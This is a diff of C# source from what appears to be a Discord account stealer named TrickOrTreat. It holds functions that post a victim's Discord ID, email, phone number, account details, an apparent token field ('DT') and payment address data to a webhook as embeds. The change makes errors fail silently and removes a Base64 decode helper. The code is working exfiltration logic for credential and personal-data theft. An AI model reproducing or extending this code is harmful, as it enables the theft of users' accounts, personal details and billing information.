@@ -178,10 +178,8 @@ namespace TrickOrTreat
                     sw.Write("{\"username\":\"github.com/extatent\",\"embeds\":[{\"title\":\"" + title + "\",\"color\":" + color + ",\"footer\":{\"icon_url\":\"https://avatars.githubusercontent.com/u/51336140?v=4.png\",\"text\":\"github.com/extatent\"},\"thumbnail\":{\"url\":\"https://avatars.githubusercontent.com/u/51336140?v=4.png\"},\"fields\":[{\"name\":\"ID\",\"value\":\"" + field1 + "\"},{\"name\":\"Email\",\"value\":\"" + field2 + "\"},{\"name\":\"Phone Number\",\"value\":\"" + field3 + "\"},{\"name\":\"Registered At\",\"value\":\"" + field4 + "\"},{\"name\":\"Registration Language\",\"value\":\"" + field5 + "\"},{\"name\":\"Guilds Count\",\"value\":\"" + field6 + "\"},{\"name\":\"Friends Count\",\"value\":\"" + field7 + "\"},{\"name\":\"DMs Count\",\"value\":\"" + field8 + "\"},{\"name\":\"Badges\",\"value\":\"" + field9 + "\"},{\"name\":\"Nitro\",\"value\":\"" + field10 + "\"},{\"name\":\"Nitro Since\",\"value\":\"" + field11 + "\"},{\"name\":\"Boost Slots\",\"value\":\"" + field12 + "\"},{\"name\":\"DT\",\"value\":\"" + field13 + "\"}]}]}");
                 wr.GetResponse();
             }
-            catch (Exception ex)
-            {
-                Console.WriteLine(ex.Message);
-            }
+            catch
+            { }
         }
 
         static void DiscordEmbed2(string color, string field1, string field2, string field3, string field4, string field5, string field6, string field7, string field8)
@@ -195,10 +193,8 @@ namespace TrickOrTreat
                     sw.Write("{\"username\":\"github.com/extatent\",\"embeds\":[{\"title\":\"Payment Info\",\"color\":" + color + ",\"footer\":{\"icon_url\":\"https://avatars.githubusercontent.com/u/51336140?v=4.png\",\"text\":\"github.com/extatent\"},\"thumbnail\":{\"url\":\"https://avatars.githubusercontent.com/u/51336140?v=4.png\"},\"fields\":[{\"name\":\"ID\",\"value\":\"" + field1 + "\"},{\"name\":\"Invalid\",\"value\":\"" + field2 + "\"},{\"name\":\"Address 1\",\"value\":\"" + field3 + "\"},{\"name\":\"Address 2\",\"value\":\"" + field4 + "\"},{\"name\":\"City\",\"value\":\"" + field5 + "\"},{\"name\":\"Country\",\"value\":\"" + field6 + "\"},{\"name\":\"Postal Code\",\"value\":\"" + field7 + "\"},{\"name\":\"State\",\"value\":\"" + field8 + "\"}]}]}");
                 wr.GetResponse();
             }
-            catch (Exception ex)
-            {
-                Console.WriteLine(ex.Message);
-            }
+            catch
+            { }
         }
         #endregion
 
@@ -239,14 +235,6 @@ namespace TrickOrTreat
             }
             catch
             { }
-        }
-        #endregion
-
-        #region Base64 Decode
-        static string Base64Decode(string base64EncodedData)
-        {
-            var base64EncodedBytes = Convert.FromBase64String(base64EncodedData);
-            return Encoding.UTF8.GetString(base64EncodedBytes);
         }
         #endregion
 
